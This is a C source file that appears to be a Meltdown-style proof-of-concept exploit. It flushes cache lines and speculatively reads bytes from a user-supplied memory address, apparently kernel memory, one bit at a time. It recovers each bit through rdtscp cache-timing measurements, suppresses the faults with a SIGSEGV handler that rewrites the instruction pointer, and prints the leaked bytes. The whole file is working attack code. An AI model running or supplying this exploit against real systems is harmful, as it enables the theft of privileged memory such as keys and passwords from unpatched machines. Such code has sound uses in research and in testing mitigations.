#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>

#include <x86intrin.h>

//#define DEBUG 1

/* comment out if getting illegal insctructions error */
#ifndef HAVE_RDTSCP
# define HAVE_RDTSCP 1
#endif


#define TARGET_OFFSET 9
#define TARGET_SIZE (1 << TARGET_OFFSET)
#define BITS_BY_READ	2

static char target_array[BITS_BY_READ * TARGET_SIZE];

void clflush_target(void)
{
	int i;

	for (i = 0; i < BITS_BY_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

extern char stopspeculate[];

void speculate(unsigned long addr, char bit)
{
	asm volatile (
		"lea %[target], %%rbx\n\t"
		"1:\n\t"

		".rept 300\n\t"
		//".rept 0\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movb (%[addr]), %%al\n\t"
		"ror %[bit], %%rax\n\t"
		"and $1, %%rax\n\t"
		"jz 1b\n\t"

		"shl $9, %%rax\n\t"
		"movq (%%rbx, %%rax, 1), %%rbx\n\t"

		"stopspeculate: nop\n\t"
		:
		: [target] "m" (target_array),
		  [addr] "r" (addr),
		  [bit] "r" (bit) : "rax", "rbx"
	);
}

static inline //__attribute__((always_inline))
int
get_access_time(char *addr)
{
	int time1, time2, junk;
	volatile int j;

#if HAVE_RDTSCP
	time1 = __rdtscp(&junk);
	j = *addr;
	time2 = __rdtscp(&junk);
#else
	time1 = __rdtsc();
	j = *addr;
	_mm_mfence();
	time2 = __rdtsc();
#endif

	return time2 - time1;
}

static int CACHE_HIT_THRESHOLD = 80;
static int hist[BITS_BY_READ];
void check(void)
{
	int i, time;
	char *addr;

	for (i = 0; i < BITS_BY_READ; i++) {
		addr = &target_array[i * TARGET_SIZE];

		time = get_access_time(addr);

		if (time <= CACHE_HIT_THRESHOLD)
			hist[i]++;
	}
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
	ucontext_t *ucontext = context;
	ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
	return;
}

int set_signal(void)
{
	struct sigaction act = {
		.sa_sigaction = sigsegv,
		.sa_flags = SA_SIGINFO,
	};

	return sigaction(SIGSEGV, &act, NULL);
}

#define CYCLES 10000
int readbit(int fd, unsigned long addr, char bit)
{
	int i;
	static char buf[256];

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {
		(void) pread(fd, buf, sizeof(buf), 0);

		clflush_target();

		speculate(addr, bit);
		check();
	}

#ifdef DEBUG
	for (i = 0; i < BITS_BY_READ; i++)
		printf("addr %lx hist[%x] = %d\n", addr, i, hist[i]);
#endif

	if (hist[1] > CYCLES / 10)
		return 1;
	return 0;
}

int readbyte(int fd, unsigned long addr)
{
	int bit, res = 0;
	for (bit = 0; bit < 8; bit ++ )
		res |= (readbit(fd, addr, bit) << bit);

	return res;
}

static char *progname;
int usage(void)
{
	printf("%s: [hexaddr] [size]\n", progname);
	return 1;
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	if (0) {
		CACHE_HIT_THRESHOLD = 80;
		return;
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	CACHE_HIT_THRESHOLD = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, CACHE_HIT_THRESHOLD);
}

int main(int argc, char *argv[])
{
	int ret, fd, i;
	unsigned long addr, size;

	progname = argv[0];
	if (argc < 3)
		return usage();

	if (sscanf(argv[1], "%lx", &addr) != 1)
		return usage();

	if (sscanf(argv[2], "%lx", &size) != 1)
		return usage();

	memset(target_array, 1, sizeof(target_array));

	ret = set_signal();

	set_cache_hit_threshold();

	fd = open("/proc/version", O_RDONLY);

	for (i = 0; i < size; i++) {
		ret = readbyte(fd, addr);
		printf("%lx = %c %x\n", addr, ret, ret);

		addr++;
	}

	close(fd);

	return 0;
}
